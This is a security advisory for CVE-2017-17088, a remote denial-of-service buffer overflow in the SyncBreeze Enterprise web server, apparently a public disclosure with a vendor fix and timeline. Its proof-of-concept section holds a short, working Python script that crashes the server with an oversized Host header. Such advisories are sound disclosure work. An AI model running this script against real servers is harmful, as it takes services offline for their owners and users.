@@ -1,0 +1,88 @@
+=============================================
+MGC ALERT 2017-007
+- Original release date: November 30, 2017
+- Last revised:  December 14, 2017
+- Discovered by: Manuel García Cárdenas
+- Severity: 7,5/10 (CVSS Base Score)
+- CVE-ID: CVE-2017-17088
+=============================================
+
+I. VULNERABILITY
+-------------------------
+SyncBreeze <= 10.2.12 - Denial of Service
+
+II. BACKGROUND
+-------------------------
+SyncBreeze is a fast, powerful and reliable file synchronization solution
+for local disks, network shares, NAS storage devices and enterprise storage
+systems.
+
+III. DESCRIPTION
+-------------------------
+The Enterprise version of SyncBreeze is affected by a Remote Denial of
+Service vulnerability.
+
+The web server does not check bounds when reading server request in the
+Host header on making a connection, resulting in a classic Buffer Overflow
+that causes a Denial of Service.
+
+To exploit the vulnerability only is needed use the version 1.1 of the HTTP
+protocol to interact with the application.
+
+IV. PROOF OF CONCEPT
+-------------------------
+#!/usr/bin/python
+import sys, socket
+
+host = sys.argv[1]
+buffer="GET / HTTP/1.1\r\n"
+buffer+="Host: "+"A"*2000+"\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, 80))
+s.send(buffer)
+s.close()
+
+V. BUSINESS IMPACT
+-------------------------
+Availability compromise can result from these attacks.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+SyncBreeze <= 10.2.12
+
+VII. SOLUTION
+-------------------------
+Vendor release 10.3 version
+http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.3.14.exe
+
+VIII. REFERENCES
+-------------------------
+http://www.syncbreeze.com/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+November 30, 2017 1: Initial release
+December 14, 2017 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+November 30, 2017 1: Vulnerability acquired by Manuel Garcia Cardenas
+November 30, 2017 2: Send to vendor
+December 6,  2017 3: Vendor fix the vulnerability and release a new version
+December 14, 2017 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
